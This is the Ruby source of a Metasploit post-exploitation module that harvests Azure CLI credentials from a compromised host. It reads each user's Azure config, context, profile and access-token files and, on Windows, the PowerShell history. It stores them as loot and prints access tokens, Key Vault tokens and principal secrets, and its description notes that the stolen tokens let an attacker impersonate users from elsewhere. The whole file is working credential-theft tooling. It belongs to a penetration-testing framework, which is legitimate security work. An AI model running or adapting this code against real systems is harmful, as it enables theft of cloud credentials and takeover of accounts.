##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Unix
  include Msf::Post::Windows::UserProfiles
  include Msf::Post::Azure

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Azure CLI Credentials Gatherer',
        'Description' => %q{
          This module will collect the Azure CLI 2.0+ (az cli) settings files
          for all users on a given target. These configuration files contain
          JWT tokens used to authenticate users and other subscription information.
          Once tokens are stolen from one host, they can be used to impersonate
          the user from a different host.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'James Otten <jamesotten1[at]gmail.com>', # original author
          'h00die' # additions
        ],
        'Platform' => ['win', 'linux', 'osx'],
        'SessionTypes' => ['meterpreter'],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => []
        }
      )
    )
  end

  def parse_json(data)
    data.strip!
    # remove BOM, https://www.qvera.com/kb/index.php/2410/csv-file-the-start-the-first-header-column-name-can-remove-this
    data.gsub!("\xEF\xBB\xBF", '')
    json_blob = nil
    begin
      json_blob = JSON.parse(data)
    rescue ::JSON::ParserError => e
      print_error("Unable to parse json blob: #{e}")
    end
    json_blob
  end

  def user_dirs
    user_dirs = []
    if session.platform == 'windows'
      grab_user_profiles.each do |profile|
        user_dirs.push(profile['ProfileDir'])
      end
    elsif session.platform == 'linux' || session.platform == 'osx'
      user_dirs = enum_user_directories
    else
      fail_with(Failure::BadConfig, 'Unsupported platform')
    end
    user_dirs
  end

  def get_az_version
    command = 'az --version'
    command = "powershell.exe #{command}" if session.platform == 'windows'
    version_output = cmd_exec(command, 60)
    version_output.match(/azure-cli \((.*)\)/)
  end

  def run
    version = get_az_version
    unless version.nil?
      print_status("az cli version: #{version[1]}")
    end
    profile_table = Rex::Text::Table.new(
      'Header' => 'Subscriptions',
      'Indent' => 1,
      'Columns' => ['Account Name', 'Username', 'Cloud Name']
    )
    tokens_table = Rex::Text::Table.new(
      'Header' => 'Tokens',
      'Indent' => 1,
      'Columns' => ['Source', 'Username', 'Count']
    )
    context_table = Rex::Text::Table.new(
      'Header' => 'Context',
      'Indent' => 1,
      'Columns' => ['Username', 'Account Type', 'Access Token', 'Graph Access Token', 'MS Graph Access Token', 'Key Vault Token', 'Principal Secret']
    )

    user_dirs.map do |user_directory|
      vprint_status("Looking for az cli data in #{user_directory}")
      # leaving all these as lists for consistency and future expansion

      # ini file content, not json.
      vprint_status('  Checking for config files')
      %w[.Azure\config].each do |file_location|
        possible_location = ::File.join(user_directory, file_location)
        next unless exists?(possible_location)

        # we would prefer readable?, but windows doesn't support it, so avoiding
        # an extra code branch, just handle read errors later on

        data = read_file(possible_location)
        next unless data

        # https://stackoverflow.com/a/16088751/22814155 no ini ctype
        loot = store_loot 'azure.config.ini', 'text/plain', session, data, file_location, 'Azure CLI Config'
        print_good "    #{file_location} stored in #{loot}"
      end

      vprint_status('  Checking for context files')
      %w[.Azure/AzureRmContext.json].each do |file_location|
        possible_location = ::File.join(user_directory, file_location)
        next unless exists?(possible_location)

        data = read_file(possible_location)
        next unless data

        loot = store_loot 'azure.context.json', 'text/json', session, data, file_location, 'Azure CLI Context'
        print_good "    #{file_location} stored in #{loot}"
        data = parse_json(data)
        next if data.nil?

        results = process_context_contents(data)
        results.each do |result|
          context_table << result
        end
      end

      vprint_status('  Checking for profile files')
      %w[.Azure/azureProfile.json].each do |file_location|
        possible_location = ::File.join(user_directory, file_location)
        next unless exists?(possible_location)

        data = read_file(possible_location)
        next unless data

        loot = store_loot 'azure.profile.json', 'text/json', session, data, file_location, 'Azure CLI Profile'
        print_good "    #{file_location} stored in #{loot}"
        data = parse_json(data)
        next if data.nil?

        results = process_profile_file(data)
        results.each do |result|
          profile_table << result
        end
      end

      %w[.azure/accessTokens.json].each do |file_location|
        possible_location = ::File.join(user_directory, file_location)
        next unless exists?(possible_location)

        data = read_file(possible_location)
        next unless data

        loot = store_loot 'azure.token.json', 'text/json', session, data, file_location, 'Azure CLI Tokens'
        print_good "    #{file_location} stored in #{loot}"
        results = process_tokens_file(data)
        results.each do |result|
          tokens_table << result
        end
      end
    end

    # windows only
    if session.platform == 'windows'
      vprint_status('  Checking for console history files')
      ['%USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt'].each do |file_location|
        next unless exists?(file_location)

        data = read_file(file_location)
        next unless data

        loot = store_loot 'azure.console_history.txt', 'text/plain', session, data, file_location, 'Azure CLI Profile'
        print_good "    #{file_location} stored in #{loot}"

        results = print_consolehost_history(data)
        results.each do |result|
          print_good(result)
        end
      end
    end

    print_good(profile_table.to_s) unless profile_table.rows.empty?
    print_good(tokens_table.to_s) unless tokens_table.rows.empty?
    print_good(context_table.to_s) unless context_table.rows.empty?
  end
end
